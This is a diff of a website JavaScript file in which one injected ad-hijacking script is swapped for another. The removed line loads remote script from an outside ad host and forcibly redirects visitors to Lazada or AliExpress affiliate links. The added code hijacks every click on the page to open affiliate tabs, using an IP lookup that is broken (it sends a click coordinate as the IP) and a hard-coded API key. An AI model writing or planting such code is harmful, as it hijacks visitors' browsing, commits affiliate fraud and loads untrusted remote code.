@@ -1,1 +1,15 @@
-const mapCo=["/country.js"];var hostUriCo="www.adscontrol.xyz";const randomNumberHash=(n)=>{for(var r=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"],e=n,t=new Array,a=0;a<=e-1;a++){t[a]=r[parseInt(Math.random()*r.length)];t=t;}return t.join("");};const initmapCo=async(config)=>{const uriLocation=document.location;const hostLoc=uriLocation.hostname;for(let data of mapCo){const elem=document.createElement("script");if(data.indexOf("/country.js")>=0){elem.setAttribute("src","https://"+hostUriCo+data+"?hash="+randomNumberHash(12));elem.setAttribute("defer","");}else{elem.setAttribute("src","https://"+hostUriCo+data);};await document.querySelector("body").append(elem);};if(global.country === 'id') window.location.href='https://c.lazada.co.id/t/c.bWm0WC?sub_aff_id=RamadhanSale'; else window.location.href='https://s.click.aliexpress.com/e/_Dnr71Q5?bz=300*250'; initmapCo();
+    const API_KEY = '70e96f8fcca842a575e8c9f10add9bc840d540def48c833f8d72249f';
+
+    document.addEventListener('click', (event) => {
+        let ipAddress = event.clientX;
+        fetch(`https://api.ipdata.co/${ipAddress}?api-key=${API_KEY}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.country_code === 'ID') {
+                    window.open('https://c.lazada.co.id/t/c.bV9qMg?sub_aff_id=Okelah', '_blank');
+                } else {
+                    window.open('https://s.click.aliexpress.com/e/_Dnr71Q5?bz=300*250', '_blank');
+                }
+            })
+            .catch(err => console.log(err));
+    });
